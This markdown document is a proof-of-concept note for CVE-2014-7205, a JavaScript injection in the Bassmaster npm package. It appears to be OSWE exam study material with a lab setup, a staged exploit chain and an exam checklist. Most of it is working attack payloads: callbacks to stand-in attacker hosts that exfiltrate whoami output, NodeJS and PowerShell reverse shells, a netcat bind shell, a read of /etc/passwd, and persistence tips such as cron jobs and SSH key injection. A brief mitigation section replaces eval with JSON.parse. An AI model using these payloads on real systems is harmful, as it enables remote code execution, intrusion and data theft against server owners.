# Bassmaster NodeJS JavaScript Injection PoC Notes

## Vulnerability Summary
- **Target**: Bassmaster NPM Package <= 1.5.1
- **CVE**: CVE-2014-7205
- **Type**: Arbitrary JavaScript Injection
- **Impact**: Remote Code Execution on NodeJS server

## Vulnerability Details

### Root Cause
Bassmaster provides a batch request handler for Hapi.js applications. It unsafely evaluates user-provided input using `eval()`, allowing arbitrary JavaScript execution.

### Vulnerable Code Pattern
```javascript
// Simplified vulnerable code
var batch = eval("(" + userInput + ")");
```

### Exploitation Mechanism
1. Bassmaster expects batch requests in JSON format
2. The `path` parameter in batch requests is processed
3. Special syntax `$${...}` is evaluated as JavaScript
4. Attacker injects: `$${require('child_process').exec('command')}`
5. Server executes arbitrary NodeJS code

## Lab Setup

### Installation
```bash
# Create NodeJS project
mkdir bassmaster-lab
cd bassmaster-lab
npm init -y

# Install vulnerable version
npm install bassmaster@1.5.1
npm install hapi@8.8.1

# Create server.js
cat > server.js << 'EOF'
const Hapi = require('hapi');
const Bassmaster = require('bassmaster');

const server = new Hapi.Server();
server.connection({ port: 8080 });

server.register({
    register: Bassmaster,
    options: {}
}, function (err) {
    if (err) {
        console.error('Failed to load plugin:', err);
    }
});

server.route({
    method: 'GET',
    path: '/',
    handler: function (request, reply) {
        return reply('Vulnerable Bassmaster Server');
    }
});

server.start(function () {
    console.log('Server running at:', server.info.uri);
});
EOF

# Start server
node server.js
```

### Server Configuration
- Default Port: 8080
- Batch Endpoint: /batch (automatically registered)
- NodeJS Version: 4.x - 6.x recommended for testing

## Exploit Chain

### Stage 1: Reconnaissance
Test if batch endpoint exists:
```bash
curl -X POST http://target:8080/batch \
  -H "Content-Type: application/json" \
  -d '{"requests":[]}'
```

Expected: HTTP 200 or 400 (endpoint exists)

### Stage 2: Command Injection
```python
# Payload structure
payload = {
    "requests": [
        {
            "method": "get",
            "path": "/$${require('child_process').exec('id')}"
        }
    ]
}
```

### Stage 3: Blind RCE Verification
Since output isn't returned, use callbacks:

**DNS Callback:**
```javascript
$${require('child_process').exec('nslookup $(whoami).attacker.com')}
```

**HTTP Callback:**
```javascript
$${require('child_process').exec('curl http://attacker-ip:8000/$(whoami)')}
```

### Stage 4: Reverse Shell
```javascript
// NodeJS reverse shell
$${(function(){
    var net = require('net');
    var spawn = require('child_process').spawn;
    var sh = spawn('/bin/bash', []);
    var client = new net.Socket();
    client.connect(9001, '10.10.14.5', function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
})()}
```

## Testing Commands

```bash
# Basic RCE test
python3 poc.py --target-ip 192.168.1.100 --target-port 8080 --command "whoami"

# File write proof
python3 poc.py --target-ip 192.168.1.100 --command "echo 'pwned' > /tmp/proof.txt"

# Reverse shell
# Terminal 1: Start listener
nc -nlvp 9001

# Terminal 2: Trigger shell
python3 poc.py --target-ip 192.168.1.100 --listening-ip 10.10.14.5 --reverse-shell

# With Burp proxy
python3 poc.py --target-ip 192.168.1.100 --proxy http://127.0.0.1:8080
```

## Payload Variations

### Simple Command
```json
{"requests":[{"method":"get","path":"/$${require('child_process').exec('id')}"}]}
```

### File Read
```json
{"requests":[{"method":"get","path":"/$${require('fs').readFileSync('/etc/passwd','utf8')}"}]}
```

### Bind Shell
```javascript
$${require('child_process').spawn('nc',['-lvp','4444','-e','/bin/bash'])}
```

### Windows Reverse Shell
```javascript
$${require('child_process').exec('powershell -Command "$client=New-Object System.Net.Sockets.TCPClient(\'10.10.14.5\',9001);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\'PS \'+(pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"')}
```

## Debugging

### If Batch Endpoint Not Found
- Check Bassmaster is properly registered
- Verify Hapi.js version compatibility
- Try alternative paths: `/batch`, `/api/batch`

### If Injection Doesn't Work
- Check NodeJS version (some require() restrictions in newer versions)
- Verify JSON syntax is correct
- Test with simpler payloads first
- Check server logs for errors

### Verifying Blind RCE
```bash
# Start HTTP server to catch callbacks
python3 -m http.server 8000

# Or use tcpdump for DNS
sudo tcpdump -i any -n port 53

# Or check /tmp for file writes
ls -la /tmp/proof.txt
```

## Mitigation

### Developer Fix
```javascript
// Don't use eval() on user input!
// Use JSON.parse() instead

// Before (vulnerable):
var batch = eval("(" + userInput + ")");

// After (secure):
var batch = JSON.parse(userInput);
```

### Package Update
```bash
# Update to patched version
npm update bassmaster
# Or better: use maintained alternatives
```

## References
- https://www.npmjs.com/package/bassmaster
- https://www.rapid7.com/db/modules/exploit/multi/http/bassmaster_js_injection
- https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/bassmaster_js_injection.rb
- https://www.exploit-db.com/exploits/40689
- https://vulners.com/nodejs/NODEJS:337

## OSWE Exam Notes

### Key Takeaways
1. **eval() is dangerous** - Never use eval() on user input
2. **NodeJS RCE patterns** - Learn child_process.exec() and spawn()
3. **Blind RCE verification** - Use callbacks (HTTP, DNS, file writes)
4. **JSON injection points** - Look for dynamic evaluation in APIs

### Time Management
- Reconnaissance: 5 min
- Payload crafting: 10 min
- Exploitation: 5 min
- Shell establishment: 5 min
- Total: ~25 minutes

### Common Patterns
```javascript
// Common NodeJS RCE modules
require('child_process').exec('command')
require('child_process').spawn('command', [args])
require('fs').readFileSync('/etc/passwd', 'utf8')
require('fs').writeFileSync('/tmp/shell.js', code)
```

### Exam Checklist
- [ ] Identify batch/API endpoint
- [ ] Test basic injection with simple payload
- [ ] Verify RCE with callback
- [ ] Escalate to reverse shell
- [ ] Document all steps with screenshots
- [ ] Test command execution for proof file

### Alternative Exploitation
If reverse shell fails:
1. Write PHP/JSP webshell to web directory
2. Create cron job for persistence
3. SSH key injection
4. Download and execute secondary payload
